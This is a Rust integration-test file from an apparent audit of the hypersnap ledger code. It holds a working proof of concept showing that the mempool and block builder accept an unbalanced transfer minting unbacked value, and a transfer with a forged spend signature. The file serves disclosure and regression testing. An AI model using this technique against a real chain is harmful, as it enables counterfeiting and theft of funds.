// =====================================================================
// C2 — Unbalanced/unsigned transfers admitted to the verkle tree.
//
// This is the compile-verifiable integration-test form of the PoC at
// `findings/poc/c2-unbalanced-transfer/poc.rs` (Track C, lead-confirmed
// CRITICAL). It is INTENTIONALLY designed to FAIL in the current,
// unfixed codebase by way of `.expect()` not panicking — that is, the
// asserts confirm the BUG admits the malicious tx end-to-end.
//
// When the fix lands (wire `validate_with_input_pubkeys` +
// `verify_balance_with_blinding_diff` into `submit_transfer` and/or
// `apply_message`), `mempool.submit_transfer(...)` will return Err and
// the `expect("BUG ...")` will panic — flipping the tests' meaning to
// "regression guard". For now they pass because the bug is live.
//
// To run from `code/hypersnap/`:
//     cargo test --test c2_poc
// or build-only:
//     cargo test --no-run --test c2_poc
//
// This file ONLY uses the public surface of the `hypersnap` crate and
// its public deps (`hypersnap_crypto`, `rand`). No production code is
// modified by this PoC.
// =====================================================================

use hypersnap::hyper::builder::{
    note_commitment_verkle_key_public, nullifier_verkle_key_public, HyperBlockBuilder,
    PendingMessage,
};
use hypersnap::hyper::mempool::HyperMempool;
use hypersnap::hyper::transfer_codec::tx_to_proto;
use hypersnap::proto;
use hypersnap_crypto::bulletproofs::curve_adapter::Scalar;
use hypersnap_crypto::kzg::KzgSrs;
use hypersnap_crypto::kzg_lagrange::VERKLE_DOMAIN;
use hypersnap_crypto::tokens::{
    prove_value_range, schnorr_sign, Nullifier as Nf, PedersenCommitment as PC, SchnorrSignature,
    TransferInput, TransferOutput, TransferTx, DEFAULT_RANGE_BITS,
};
use hypersnap_crypto::verkle::VerkleTree;
use rand::rngs::OsRng;
use std::sync::Arc;

// -----------------------------------------------------------------
// Helper: build an UNBALANCED transfer with attacker-controlled
// values. Returns the proto-wire form and the typed form (the typed
// form is used for independent verification that the strong check
// would fail — proving the bug is the skipped check, not a false
// claim of imbalance on our part).
// -----------------------------------------------------------------
fn unbalanced_mint_transfer(
    in_value: u64,
    out_value: u64,
    fee: u64,
) -> (proto::HyperTransferTx, TransferTx) {
    let mut rng = OsRng;

    // Input note: attacker pretends some prior note exists committing to
    // `in_value`. NB: the production path never actually checks the
    // input commitment exists in the verkle tree (validate_against_store
    // has zero production callers per X-2 verdict), so this commitment
    // can be arbitrary.
    let r_in = Scalar::random(&mut rng);
    let in_commitment = PC::commit(in_value, &r_in);

    // Spend secret + nullifier.
    let x = Scalar::random(&mut rng);
    let nullifier = Nf::derive(&x, &in_commitment);
    let spend_signature: SchnorrSignature = schnorr_sign(&x, &[0u8; 32], &mut rng);

    // Output note: commit to `out_value` >> `in_value`. This is the
    // mint. A valid range proof is generated (the output value is in
    // [0, 2^64) which is the only check `validate()` performs).
    let r_out = Scalar::random(&mut rng);
    let out_commitment = PC::commit(out_value, &r_out);
    let (range_proof, _) =
        prove_value_range(out_value, &r_out, DEFAULT_RANGE_BITS, &mut rng).unwrap();

    let typed = TransferTx {
        inputs: vec![TransferInput {
            commitment: in_commitment,
            nullifier,
            spend_signature,
        }],
        outputs: vec![TransferOutput {
            commitment: out_commitment,
            range_proof,
        }],
        fee_atoms: fee,
    };
    let wire = tx_to_proto(&typed);
    (wire, typed)
}

// -----------------------------------------------------------------
// Primary PoC. End-to-end:
//   mempool admit  ->  builder apply  ->  verkle tree contains
//   the un-backed commitment  ->  importer-equivalent re-build
//   yields the same root.
// -----------------------------------------------------------------
#[test]
fn c2_poc_unbalanced_transfer_admitted_end_to_end() {
    let mut rng = OsRng;

    // Mint 10_000 atoms from a 100-atom "input" with 0 fee.
    // Residual = (100 - 10_000)·B = -9_900·B  -- NOT a pure
    // blinding-generator multiple, so balance is broken.
    let (wire_tx, typed_tx) = unbalanced_mint_transfer(100, 10_000, 0);

    // ------- Sanity: the strong validators DO catch this --------
    //
    // verify_balance_with_blinding_diff(r_diff) checks whether the
    // residual equals r_diff·B_blinding. For an unbalanced tx
    // there is NO scalar r_diff that makes this hold (the value
    // component would have to be 0, which it isn't). We check
    // against r_diff = 0 and a random scalar — both should return
    // false, proving that the strong check exists and would reject
    // this tx, and the only reason the bug exists is that no
    // production caller actually invokes it.
    assert!(
        !typed_tx.verify_balance_with_blinding_diff(&Scalar::from_bytes_mod_order([0u8; 56])),
        "expected strong balance check to reject the unbalanced tx (zero blinding-diff)"
    );
    assert!(
        !typed_tx.verify_balance_with_blinding_diff(&Scalar::random(&mut rng)),
        "expected strong balance check to reject the unbalanced tx (random blinding-diff)"
    );

    // ------- Stage 1: mempool admit ----------------------------
    let mut mempool = HyperMempool::new();
    let admit_result = mempool.submit_transfer(wire_tx.clone());
    assert!(
        admit_result.is_ok(),
        "BUG CONFIRMED: mempool admitted an unbalanced transfer: {:?}",
        admit_result
    );
    assert_eq!(mempool.transfer_count(), 1);

    // ------- Stage 2: builder apply ----------------------------
    let srs = Arc::new(KzgSrs::random_unsafe(&mut rng, VERKLE_DOMAIN));
    let mut tree = VerkleTree::new(srs.clone());
    let mut b = HyperBlockBuilder::new(&mut tree);
    let envelope = b
        .build_envelope(
            &[PendingMessage::Transfer(wire_tx.clone())],
            /* canonical_block_id = */ 1,
            /* parent_hash = */ vec![0u8; 32],
            /* extra_rules_version = */ 0,
        )
        .expect("builder must accept the unbalanced tx (BUG)");

    // The block was built. The state root is non-empty.
    assert_eq!(envelope.metadata.hyper_state_root.len(), 48);
    assert_eq!(envelope.metadata.retained_message_count, 1);

    // ------- Stage 3: verkle tree state inspection -------------
    let nullifier_bytes = typed_tx.inputs[0].nullifier.0;
    let nf_key = nullifier_verkle_key_public(&nullifier_bytes);
    assert_eq!(
        tree.get(&nf_key),
        Some(&[1u8][..]),
        "attacker-chosen nullifier is now in the verkle tree"
    );

    let out_commitment_bytes = typed_tx.outputs[0].commitment.to_bytes();
    let comm_key = note_commitment_verkle_key_public(&out_commitment_bytes);
    let stored = tree.get(&comm_key);
    assert!(
        stored.is_some(),
        "BUG CONFIRMED: un-backed 10_000-atom commitment is in the verkle tree"
    );

    // ------- Stage 4: importer-equivalent re-build -------------
    //
    // src/hyper/importer.rs runs the SAME builder on a fresh tree.
    // The root-match check succeeds iff the builder is
    // deterministic over the same inputs (it is). So an importing
    // validator sees the unbalanced tx, applies it without any
    // per-tx validation, and accepts the root the (also-honest)
    // proposer signed.
    //
    // We simulate this by building a SECOND tree from scratch with
    // the same SRS and message list, and asserting the root is
    // bit-identical.
    let mut tree2 = VerkleTree::new(srs.clone());
    let mut b2 = HyperBlockBuilder::new(&mut tree2);
    let envelope2 = b2
        .build_envelope(
            &[PendingMessage::Transfer(wire_tx.clone())],
            1,
            vec![0u8; 32],
            0,
        )
        .unwrap();
    assert_eq!(
        envelope.metadata.hyper_state_root, envelope2.metadata.hyper_state_root,
        "importer-equivalent re-build produces the same state root — the \
         un-backed commitment is canonically part of the chain state"
    );
}

// -----------------------------------------------------------------
// Stretch PoC: spend signature does NOT match any owner of the
// "input" commitment. Confirms there is no spend-sig check
// anywhere in the production path.
// -----------------------------------------------------------------
#[test]
fn c2_poc_bogus_spend_signature_admitted() {
    let mut rng = OsRng;

    // Build an unbalanced tx, then OVERWRITE the spend_signature
    // with one signed by an unrelated random secret.
    let (mut wire_tx, _typed_tx) = unbalanced_mint_transfer(100, 10_000, 0);
    let attacker_secret = Scalar::random(&mut rng);
    let bogus_sig = schnorr_sign(&attacker_secret, &[0u8; 32], &mut rng);
    wire_tx.inputs[0].spend_signature = bogus_sig.to_bytes().to_vec();

    // ------- Mempool admit -------------------------------------
    let mut mempool = HyperMempool::new();
    let admit_result = mempool.submit_transfer(wire_tx.clone());
    assert!(
        admit_result.is_ok(),
        "BUG CONFIRMED: mempool admitted a transfer with an invalid spend \
         signature: {:?}",
        admit_result
    );

    // ------- Builder apply -------------------------------------
    let srs = Arc::new(KzgSrs::random_unsafe(&mut rng, VERKLE_DOMAIN));
    let mut tree = VerkleTree::new(srs);
    let mut b = HyperBlockBuilder::new(&mut tree);
    let env = b
        .build_envelope(&[PendingMessage::Transfer(wire_tx)], 1, vec![0u8; 32], 0)
        .expect("BUG CONFIRMED: builder applied a transfer with an invalid spend signature");
    assert_eq!(env.metadata.retained_message_count, 1);
}

// -----------------------------------------------------------------
// Negative-control: confirm the strong validators in tokens.rs
// DO reject these txs when actually invoked. This proves the bug
// is "the strong validators aren't called", not "the strong
// validators are wrong".
// -----------------------------------------------------------------
#[test]
fn c2_negative_control_strong_validators_reject() {
    use hypersnap_crypto::tokens::TransferError;
    let mut rng = OsRng;
    let (_wire, typed) = unbalanced_mint_transfer(100, 10_000, 0);

    // 1. Structural validate() does NOT catch imbalance — confirms
    //    the docstring at tokens.rs:287-301.
    assert!(
        typed.validate().is_ok(),
        "validate() incorrectly rejected — bug pattern would be different"
    );

    // 2. verify_balance_with_blinding_diff catches the imbalance
    //    for any candidate r_diff.
    for _ in 0..8 {
        let r_diff = Scalar::random(&mut rng);
        assert!(
            !typed.verify_balance_with_blinding_diff(&r_diff),
            "verify_balance_with_blinding_diff must reject an imbalanced tx \
             for every r_diff"
        );
    }

    // 3. validate_with_input_pubkeys catches the bogus spend
    //    signature when given the "wrong" input pubkey (i.e. any
    //    pubkey other than the one the signature was generated
    //    against). We feed it a random pubkey to simulate the
    //    store-recovered owner of a fake input commitment.
    use hypersnap_crypto::bulletproofs::PedersenGens;
    use hypersnap_crypto::tokens::DecafPoint as Point;
    let pc = PedersenGens::default();
    let other_secret = Scalar::random(&mut rng);
    let other_pubkey = Point::multiscalar_mul(&[other_secret], &[pc.B]);
    let res = typed.validate_with_input_pubkeys(&[other_pubkey]);
    assert!(
        matches!(res, Err(TransferError::SpendSignatureInvalid(_))),
        "validate_with_input_pubkeys must reject when sig key != input owner, got {:?}",
        res
    );
}
